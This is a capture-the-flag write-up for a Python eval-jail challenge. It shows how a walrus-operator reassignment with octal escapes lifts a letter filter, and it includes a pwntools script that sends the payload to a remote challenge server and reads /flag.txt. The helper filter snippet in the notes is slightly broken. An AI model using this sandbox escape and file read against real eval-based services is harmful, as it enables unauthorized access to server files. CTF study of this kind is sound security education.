#### abcdef
- points earned: 50

#### Notes
- These user can use these characters: `!"#$%&\'()*+,-./0123456789:;<=>?@[\\]^_abcdef{|}~`.  The code below can be used to generate these characters.
	```python
	def filter_c(c):
		if ord(c) < 32 or ord(c) > 126:
			return False
		if c.isalpha() and c not in abcdef:
			return False
	return True
	
	c = [chr(c) for c in range(32, 127)]
	c = list(filter(filter_c, c))
	c = ''.join(c)
	print(f'{c=}')
	```
- A variable can be set inside an eval by using the walrus operator
	`(myVar := 'myVal')`
- Uppercase and lowercase characters can be represented in octal with something like `\161` (for `a`) which is allowed through the `is_valid` function.
- So the theory on the solution is to reset the value of the variable `abcdef` to allow all alpha characters.  Then, I won't be as limited an can do something like `print(open().read())` to open and print the flag.

#### Solution
```python
from pwn import *
context.log_level = 'debug'
  
# all lowercase letters in octal
a = '\\141\\142\\143\\144\\145\\146\\147\\150\\151\\152\\153\\154\\155\\156\\157\\160\\161\\162\\163\\164\\165\\166\\167\\170\\171\\172\\101\\102\\103\\104\\105\\106\\107\\110\\111\\112\\113\\114\\115\\116\\117\\120\\121\\122\\123\\124\\125\\126\\127\\130\\131\\132'

p = remote('34.118.61.99', 10029)
p.recvuntil(b'> ')

# set abcdef to allow all alpha characters
p.sendline(f'(abcdef := "{a}")'.encode())
p.recvuntil(b'> ')

# read flag
p.sendline(f'print(open("/flag.txt", "r").read())'.encode())
p.interactive()
```